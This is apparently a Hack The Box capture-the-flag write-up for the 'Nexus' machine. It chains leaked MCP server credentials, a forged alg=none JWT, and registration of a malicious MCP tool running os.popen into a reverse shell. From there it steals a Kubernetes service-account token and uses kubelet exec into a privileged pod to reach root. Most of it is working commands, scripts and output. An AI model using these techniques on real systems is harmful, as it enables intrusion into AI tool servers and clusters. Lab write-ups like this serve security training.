# HTB Nexus — Full Write-up

**Target:** `10.129.234.54`

## 1. Initial access

We already had SSH access as `nightfall` and found the user flag:

```bash
ssh nightfall@10.129.234.54
cat user.txt
```

Result:

```text
640ab44bb3fa0c586f464e727f0e66a3
```

Then we found an MCP configuration:

```bash
cat ~/.mcp/config.json
```

It contained:

```json
{
  "server": "http://10.129.81.75:30080",
  "status_endpoint": "/api/v1/version",
  "user": "langflow-bot",
  "password": "Langfl0w@mcp2026!"
}
```

The exposed credentials allowed us to authenticate to the MCP server.

## 2. JWT `none` algorithm vulnerability

We created:

```bash
cat > /tmp/craft.py << 'EOF'
import base64
import json

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header = b64url(json.dumps({
    "alg": "none",
    "typ": "JWT"
}).encode())

payload = b64url(json.dumps({
    "sub": "attacker",
    "role": "admin"
}).encode())

print(f"{header}.{payload}.")
EOF
```

Then:

```bash
ADMIN_JWT="$(python3 /tmp/craft.py)"
```

The MCP server accepted the unsigned JWT because it supported the vulnerable `none` algorithm.

We verified admin access with:

```bash
curl -s http://10.129.81.75:30080/api/v1/tools \
  -H "Authorization: Bearer $ADMIN_JWT"
```

This showed the registered tools.

## 3. Registering our own MCP tool

The critical primitive was the admin-only endpoint:

```text
POST /api/v1/tools
```

We registered a debugging tool:

```bash
curl -si -X POST \
  http://10.129.81.75:30080/api/v1/tools \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $ADMIN_JWT" \
  -d '{
    "name":"debug2",
    "description":"diagnostic",
    "inputSchema":{"type":"object","properties":{}},
    "code":"import os\nprint(os.popen(\"id; hostname; pwd\").read())"
  }'
```

Then invoked it through MCP:

```bash
curl -s -X POST \
  http://10.129.81.75:30080/mcp \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $ADMIN_JWT" \
  -d '{"jsonrpc":"2.0","id":5,"method":"tools/call","params":{"name":"debug2","arguments":{}}}'
```

This gave execution inside the MCP container:

```text
uid=1000(mcp) gid=1000(mcp) groups=1000(mcp)
mcp-server-54464cb475-29ztf
```

## 4. Getting a shell

We registered a shell tool whose code created a reverse shell.

On Kali:

```bash
sudo nc -lvnp 9001
```

Triggering the MCP tool produced:

```text
mcp@mcp-server-...:/app$
```

We initially had trouble because the reverse shell closed quickly, so we repeatedly recreated it. Eventually we had a working container shell.

## 5. Kubernetes service-account discovery

Inside the MCP container:

```bash
id
```

showed:

```text
uid=1000(mcp) gid=1000(mcp) groups=1000(mcp)
```

We discovered the Kubernetes service-account token:

```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

Then checked the service-account permissions:

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

curl -sk -X POST \
  "https://10.43.0.1:443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}' \
  | python3 -m json.tool
```

The important permission was:

```text
nodes/proxy
```

with:

```text
verbs: ["get"]
```

## 6. Discovering the privileged pod

We queried the node API:

```bash
curl -sk "https://10.129.81.75:10250/pods" \
  -H "Authorization: Bearer $TOKEN" \
  | python3 -c '
import sys,json
data=json.load(sys.stdin)

for item in data["items"]:
    ns=item["metadata"]["namespace"]
    name=item["metadata"]["name"]

    vols=[
        v for v in item["spec"].get("volumes",[])
        if "hostPath" in v
    ]

    for c in item["spec"]["containers"]:
        if c.get("securityContext",{}).get("privileged") and vols:
            paths=[v["hostPath"]["path"] for v in vols]
            cname=c["name"]
            print(
                f"[!] PRIVILEGED: {ns}/{name} "
                f"- container: {cname} "
                f"- hostPaths: {paths}"
            )
'
```

We found:

```text
[!] PRIVILEGED: monitoring/prometheus-prometheus-node-exporter-nmntq
- container: node-exporter
- hostPaths: ['/proc', '/sys', '/']
```

The key point is the `/` hostPath mount: the privileged node-exporter container had access to the host filesystem.

## 7. Kubernetes kubelet exec

We created `/tmp/kube_exec.py` inside the MCP container. The script connected directly to:

```text
wss://10.129.81.75:10250/exec/monitoring/prometheus-prometheus-node-exporter-nmntq/node-exporter
```

using:

```text
v4.channel.k8s.io
```

and the service-account token.

We tested:

```bash
python3 -m py_compile /tmp/kube_exec.py
```

and:

```bash
python3 -c "import websockets; print('ok')"
```

which returned:

```text
ok
```

Then:

```bash
python3 /tmp/kube_exec.py "id"
```

gave:

```text
uid=0(root) gid=65534(nobody) groups=10(wheel),65534(nobody)
```

So we had root-level command execution **inside the privileged node-exporter container**, with the host root filesystem mounted.

## 8. Read the host root flag

Because the host filesystem was mounted under `/host/root`, we ran:

```bash
python3 /tmp/kube_exec.py "cat /host/root/root/root.txt"
```

Result:

```text
389ca5c267023166b27e4cdc7bdc172a
```

We also verified the directory:

```bash
python3 /tmp/kube_exec.py "ls -la /host/root/root"
```

which showed:

```text
root.txt
```

### Nexus chain

```text
SSH
 ↓
MCP config credentials
 ↓
JWT alg=none
 ↓
Forged admin JWT
 ↓
Register arbitrary MCP tool
 ↓
Code execution in MCP pod
 ↓
Kubernetes service-account token
 ↓
nodes/proxy permission
 ↓
Privileged node-exporter pod
 ↓
Host / mounted into pod
 ↓
Kubelet WebSocket exec
 ↓
root on host filesystem
 ↓
/root/root.txt
```
